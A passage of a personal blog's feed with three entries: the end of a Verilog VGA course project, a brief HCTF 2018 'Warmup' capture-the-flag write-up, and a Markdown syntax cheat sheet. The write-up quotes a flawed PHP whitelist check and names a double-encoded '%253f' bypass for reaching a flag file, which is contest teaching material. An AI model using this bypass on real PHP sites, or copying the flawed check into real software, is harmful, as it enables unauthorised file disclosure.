G;</span><br><span class="line"><span class="keyword">reg</span> SPK;</span><br><span class="line"><span class="keyword">reg</span> HS,VS;</span><br><span class="line"><span class="keyword">reg</span> R,B;</span><br><span class="line"><span class="keyword">reg</span> G;</span><br><span class="line"><span class="keyword">always</span> @ (</span><br><span class="line">EN,</span><br><span class="line">badapple,sakura,</span><br><span class="line">HS1,VS1,HS2,VS2,</span><br><span class="line">SPK1,SPK2,</span><br><span class="line">R1,R2,G1,G2,B1,B2</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span>(EN==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">SPK=<span class="number">1</span>;</span><br><span class="line">R=<span class="number">0</span>;</span><br><span class="line">G=<span class="number">0</span>;</span><br><span class="line">B=<span class="number">0</span>;</span><br><span class="line">VS=<span class="number">0</span>;</span><br><span class="line">HS=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span>(&#123;sakura,badapple&#125;==<span class="number">2&#x27;B10</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">SPK=SPK1;</span><br><span class="line">R=R1;</span><br><span class="line">G=G1;</span><br><span class="line">B=B1;</span><br><span class="line">VS=VS1;</span><br><span class="line">HS=HS1;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span>(&#123;sakura,badapple&#125;==<span class="number">2&#x27;B01</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">SPK=SPK2;</span><br><span class="line">R=R2;</span><br><span class="line">G=G2;</span><br><span class="line">B=B2;</span><br><span class="line">VS=VS2;</span><br><span class="line">HS=HS2;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">SPK=<span class="number">1</span>;</span><br><span class="line">R=<span class="number">0</span>;</span><br><span class="line">G=<span class="number">0</span>;</span><br><span class="line">B=<span class="number">0</span>;</span><br><span class="line">VS=<span class="number">0</span>;</span><br><span class="line">HS=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/12/30/5c27a97664467.png" alt="pic7"></p><p><img src="https://i.loli.net/2018/12/30/5c27a97666422.png" alt="pic8"></p><p>I do not have a VGA monitor can only go to a friend’s bedroom to play ~</p><p>Source code: <a href="https://github.com/ACce1er4t0r/VGA_autoplay_music">Github</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Busy with digital circuit labs. It’s been a long time since I coded QAQ. Nothing coded recently, so I just pull up the digital electricity course design QWQ~&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>backup: HCTF2018 Warmup Writeup</title>
    <link href="http://aslin.site/2022/03/08/backup-HCTF2018-Warmup-Writeup/"/>
    <id>http://aslin.site/2022/03/08/backup-HCTF2018-Warmup-Writeup/</id>
    <published>2022-03-08T22:24:10.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>A easy challenge from HCTF 2018</p><span id="more"></span><p>The original plan was not to give the source code to come. Then I was told that if I didn’t give the source code, it would be impossible for people to solve it. And there was no easy Challenge, so the source code was given.</p><p><strong>Okay, the process of solving this Challenge:</strong></p><p>First of all, open the website and then look at F12, the comments hinted that there was source.php, a simple php audit, you can find that the problem appears in the following code</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="variable">$_page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It can be bypassed with %253f, combined with the flag in ffffllllaaaagggg in hint.php (Sorry. Seems like I should have told flag in &#x2F; in the challenge description)…</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;A easy challenge from HCTF 2018&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>backup: Markdown Syntax</title>
    <link href="http://aslin.site/2022/03/08/backup-Markdown-Syntax/"/>
    <id>http://aslin.site/2022/03/08/backup-Markdown-Syntax/</id>
    <published>2022-03-08T19:54:04.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>A small collection of Markdown general syntax</p><span id="more"></span><h2 id="index"><a href="#index" class="headerlink" title="index"></a><h id='index'>index</h></h2><ul><li><a href="#heading">Heading</a></li><li><a href="#quote">Quote</a></li><li><a href="#font">Font</a></li><li><a href="#line">Dividing Line</a></li><li><a href="#list">List</a></li><li><a href="#table">Table</a></li><li><a href="#code">Code</a></li><li><a href="#pic">Pic</a></li><li><a href="#herf">Hyperlink</a></li><li><a href="#auto">Autolink</a></li><li><a href="#html">HTML Tags</a></li><li><a href="#math">LaTeX</a></li><li><a href="#task">Task List</a></li></ul><hr><h1 id="Heading"><a href="#Heading" class="headerlink" title="Heading"></a><h id='heading'>Heading</h></h1><h1 id="Level-1-heading"><a href="#Level-1-heading" class="headerlink" title="Level 1 heading"></a>Level 1 heading</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Level 1 Heading</span></span><br></pre></td></tr></table></figure><h2 id="Level-2-heading"><a href="#Level-2-heading" class="headerlink" title="Level 2 heading"></a>Level 2 heading</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## Level 2 heading</span></span><br></pre></td></tr></table></figure><h3 id="Level-3-heading"><a href="#Level-3-heading" class="headerlink" title="Level 3 heading"></a>Level 3 heading</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">### Level 3 heading</span></span><br></pre></td></tr></table></figure><h4 id="Level-4-heading"><a href="#Level-4-heading" class="headerlink" title="Level 4 heading"></a>Level 4 heading</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#### Level 4 heading</span></span><br></pre></td></tr></table></figure><h5 id="Level-5-heading"><a href="#Level-5-heading" class="headerlink" title="Level 5 heading"></a>Level 5 heading</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">##### Level 5 heading</span></span><br></pre></td></tr></table></figure><h6 id="Level-6-heading"><a href="#Level-6-heading" class="headerlink" title="Level 6 heading"></a>Level 6 heading</h6><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">###### Level 6 heading</span></span><br></pre></td></tr></table></figure><hr><p>Error Cases<br>####### 7   Up to level 6 only</p><hr><h1 id="7"><a href="#7" class="headerlink" title="####### 7"></a>####### 7</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">####### 7</span></span><br><span class="line">===</span><br></pre></td></tr></table></figure><h2 id="8"><a href="#8" class="headerlink" title="######## 8"></a>######## 8</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">######## 8</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure><p><code>If it is on the top line of === or ---, it will automatically become a title (corresponding to Level 1 and Level 2)</code></p><p><a href="#index">Back to index</a></p><h1 id="Quote"><a href="#Quote" class="headerlink" title="Quote"></a><h id='quote'>Quote</h></h1><blockquote><p>This is a quote!</p><blockquote><p>And</p><blockquote><p>it can</p><blockquote><p>overlay</p><blockquote><p>seems that you can always add…</p></blockquote></blockquote></blockquote></blockquote></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; This is a quote!</span></span><br><span class="line">&gt;&gt; And</span><br><span class="line">&gt;&gt;&gt; it can</span><br><span class="line">&gt;&gt;&gt;&gt; overlay</span><br><span class="line">&gt;&gt;&gt;&gt;&gt; seems that you can always add...</span><br></pre></td></tr></table></figure><blockquote><p>Meow Meow<br>Meow Meow<br>Meow Meow</p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; Meow Meow</span></span><br><span class="line">Meow Meow</span><br><span class="line">Meow Meow</span><br></pre></td></tr></table></figure><p>It needs a line break to get the quote out</p><p><a href="#index">Back to index</a></p><h1 id="Font"><a href="#Font" class="headerlink" title="Font"></a><h id='font'>Font</h></h1><p><strong>Bold</strong></p><p><em>Italic</em></p><p><em>Also italic</em></p><p><em><strong>Bold and italic</strong></em></p><p><del>delete</del></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**Bold**</span></span><br><span class="line"><span class="emphasis">*Italic*</span></span><br><span class="line"><span class="emphasis">_Also italic_</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*Bold and italic<span class="strong">**<span class="emphasis">*</span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong">~~delete~~</span></span></span></span></span><br></pre></td></tr></table></figure><p><a href="#index">Back to index</a></p><h1 id="Dividing-Line"><a href="#Dividing-Line" class="headerlink" title="Dividing Line"></a><h id='line'>Dividing Line</h></h1><hr><hr><hr><hr><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">--test--</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="strong">****</span></span></span></span><br></pre></td></tr></table></figure><p>Why can’t you add text in the middle of the split line? ￣へ￣</p><p><a href="#index">Back to index</a></p><h1 id="List"><a href="#List" class="headerlink" title="List"></a><h id='list'>List</h></h1><p>Non-numeric list</p><ul><li>dot (〃’▽’〃)</li></ul><ul><li>dot (｀・ω・´)</li></ul><ul><li>and dot (￣.￣)</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">+</span> dot (〃&#x27;▽&#x27;〃)</span><br><span class="line"><span class="bullet">*</span> dot (｀・ω・´)</span><br><span class="line"><span class="bullet">-</span> and dot (￣.￣)</span><br></pre></td></tr></table></figure><p>Numbers List</p><ol><li>o(￣▽￣)ｄ </li><li>（￣︶￣）↗</li><li>( • ̀ω•́ )✧</li></ol><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> o(￣▽￣)ｄ </span><br><span class="line"><span class="bullet">2.</span> （￣︶￣）↗</span><br><span class="line"><span class="bullet">3.</span> ( • ̀ω•́ )✧</span><br></pre></td></tr></table></figure><p>List indent</p><ol><li>First<ol start="2"><li>Second<ol start="3"><li>Third<ol start="4"><li>Fourth<ul><li>OwO</li></ul></li></ol></li></ol></li></ol></li></ol><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> First</span><br><span class="line"><span class="bullet">   2.</span> Second</span><br><span class="line"><span class="bullet">      3.</span> Third</span><br><span class="line"><span class="bullet">         4.</span> Fourth</span><br><span class="line"><span class="bullet">            +</span> OwO</span><br></pre></td></tr></table></figure><p><a href="#index">Back to index</a></p><h1 id="Table"><a href="#Table" class="headerlink" title="Table"></a><h id='table'>Table</h></h1><table><thead><tr><th>What to write?</th><th align="center">I don’t know…</th><th align="right">Then write freely.</th></tr></thead><tbody><tr><td>This is the content</td><td align="center">This is also content</td><td align="right">also~</td></tr><tr><td>Without a colon or colon on the left</td><td align="center">Both left and right is centered</td><td align="right">On the right is the right</td></tr></tbody></table><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|What to write?|I don&#x27;t know...|Then write freely.|</span><br><span class="line">|---------|:-----:|------:|</span><br><span class="line">|This is the content  | This is also content | also~|</span><br><span class="line">|Without a colon or colon on the left|Both left and right is centered|On the right is the right|</span><br></pre></td></tr></table></figure><p><a href="#index">Back to index</a></p><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a><h id='code'>Code</h></h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Welcome to my blog~&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">``` c++</span></span><br><span class="line"><span class="code">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="code">using namespace std;</span></span><br><span class="line"><span class="code">int main() &#123;</span></span><br><span class="line"><span class="code">cout &lt;&lt; &quot;Welcome to my blog~&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="code">return 0;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">\```</span></span><br></pre></td></tr></table></figure><p>If it’s a single line of code, you can just `code`</p><p><code>print &quot;Welcome to my blog~&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`print &quot;Welcome to my blog~&quot;`</span><br></pre></td></tr></table></figure><p>``` can be combined with setting code highlighting</p><p><a href="#index">Back to index</a></p><h1 id="Picture"><a href="#Picture" class="headerlink" title="Picture"></a><h id='pic'>Picture</h></h1><p><img src="https://i.loli.net/2018/10/10/5bbdef9771e6a.jpg" alt="avatar~" title="avatar"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">avatar~</span>](<span class="link">https://i.loli.net/2018/10/10/5bbdef9771e6a.jpg &quot;avatar&quot;</span>)</span><br><span class="line">![<span class="string">pic_alt</span>](<span class="link">pic_address &quot;pic_title&quot;</span>)</span><br></pre></td></tr></table></figure><p><a href="#index">Back to index</a></p><h1 id="Hyperlink"><a href="#Hyperlink" class="headerlink" title="Hyperlink"></a><h id='herf'>Hyperlink</h></h1><ul><li><a href="https://sm.ms/" title="test">test</a></li><li><a href="https://www.google.com/" title="The world&#39;s largest search engine">404 in China</a></li><li><a href="https://www.baidu.com/" title="Learn Baidu well ah">Still can be used when looking for some Chinese materials</a></li><li><a href="https://aslin.site/" title="Home Page~">Home Page</a></li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">+</span> [<span class="string">test</span>](<span class="link">https://sm.ms &quot;test&quot;</span>)</span><br><span class="line"><span class="bullet">+</span> [<span class="string">404 in China</span>](<span class="link">https://www.google.com &quot;The world&#x27;s largest search engine&quot;</span>)</span><br><span class="line"><span class="bullet">+</span> [<span class="string">Still can be used when looking for some Chinese materials</span>](<span class="link">https://www.baidu.com &quot;Learn Baidu well ah&quot;</span>)</span><br><span class="line"><span class="bullet">+</span> [<span class="string">Home Page</span>](<span class="link">https://aslin.site &quot;Home Page~&quot;</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">alt</span>](<span class="link">address &quot;title&quot;</span>)</span><br></pre></td></tr></table></figure><hr><p>  混合~</p><p><a href="https://aslin.site/"><img src="https://i.loli.net/2018/10/10/5bbdefcf4bc8f.jpg" alt="Try mixing" title="Try mixing"></a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">![Try mixing</span>](<span class="link">https://i.loli.net/2018/10/10/5bbdefcf4bc8f.jpg &quot;Try mixing&quot;</span>)](<span class="link">https://aslin.site</span>)</span><br></pre></td></tr></table></figure><p><a href="#index">Back to index</a></p><h1 id="Autolink"><a href="#Autolink" class="headerlink" title="Autolink"></a><h id='auto'>Autolink</h></h1><p><a href="mailto:&#108;&#x6b;&#x6a;&#x6c;&#107;&#106;&#x31;&#x37;&#x34;&#64;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#108;&#x6b;&#x6a;&#x6c;&#107;&#106;&#x31;&#x37;&#x34;&#64;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;lkjlkj174@gmail.com&gt;</span><br></pre></td></tr></table></figure><p><a href="#index">Back to index</a></p><h1 id="HTML-Tags"><a href="#HTML-Tags" class="headerlink" title="HTML Tags"></a><h id='html'>HTML Tags</h></h1><p><kbd>Ctrl</kbd><br>Z<sub>a</sub><br>Z<sup>a</sup></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span>Ctrl<span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span><br><span class="line">Z<span class="tag">&lt;<span class="name">sub</span>&gt;</span>a<span class="tag">&lt;/<span class="name">sub</span>&gt;</span></span><br><span class="line">Z<span class="tag">&lt;<span class="name">sup</span>&gt;</span>a<span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="#index">Back to index</a></p><h1 id="LaTeX-公式"><a href="#LaTeX-公式" class="headerlink" title="LaTeX 公式"></a><h id='math' >LaTeX 公式</h></h1><p> <a href="https://aslin.site/" title="Todo">LaTeX</a></p><p><a href="#index">Back to index</a></p><h1 id="Task-List"><a href="#Task-List" class="headerlink" title="Task List"></a><h id='task'>Task List</h></h1><ul><li><input checked="" disabled="" type="checkbox"> Heading</li><li><input checked="" disabled="" type="checkbox"> Quate</li><li><input checked="" disabled="" type="checkbox"> Font</li><li><input checked="" disabled="" type="checkbox"> Diving Line</li><li><input checked="" disabled="" type="checkbox"> List</li><li><input checked="" disabled="" type="checkbox"> Table</li><li><input checked="" disabled="" type="checkbox"> Code</li><li><input checked="" disabled="" type="checkbox"> Picture</li><li><input checked="" disabled="" type="checkbox"> Hyperlink</li><li><input checked="" disabled="" type="checkbox"> Anchor（toc）</li><li><input checked="" disabled="" type="checkbox"> Autolink</li><li><input checked="" disabled="" type="checkbox"> LaTeX</li><li><input disabled="" type="checkbox"> Footnotes</li><li><input disabled="" type="checkbox"> Video (iframe)</li><li><input disabled="" type="checkbox"> Embedded CSS</li><li><input disabled="" type="checkbox"> Customized List</li><li><input disabled="" type="checkbox"> Flowchart</li><li><input disabled="" type="checkbox"> Timing Chart</li><li><input checked="" disabled="" type="checkbox"> HTML Tags</li><li><input checked="" disabled="" type="checkbox"> TOC</li><li><input checked="" disabled="" type="checkbox"> Task list</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">- [x] Heading</span><br><span class="line">- [x] Quate</span><br><span class="line">- [x] Font</span><br><span class="line">- [x] Diving Line</span><br><span class="line">- [x] List</span><br><span class="line">- [x] Table</span><br><span class="line">- [x] Code</span><br><span class="line">- [x] Picture</span><br><span class="line">- [x] Hyperlink</span><br><span class="line">- [x] Anchor（toc）</span><br><span class="line">- [x] Autolink</span><br><span class="line">- [x] LaTeX</span><br><span class="line">- [ ] Footnotes</span><br><span class="line">- [ ] Video (iframe)</span><br><span class="line">- [ ] Embedded CSS</span><br><span class="line">- [ ] Customized List</span><br><span class="line">- [ ] Flowchart</span><br><span class="line">- [ ] Timing Chart</span><br><span class="line">- [x] HTML Tags</span><br><span class="line">- [x] TOC</span><br><span class="line">- [x] Task list</span><br></pre></td></tr></table></figure><p><a href="#index">Back to index</a></p><hr><p>Try to translate the original blog, still lack of English skills emmmm</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;A small collection of Markdown general syntax&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
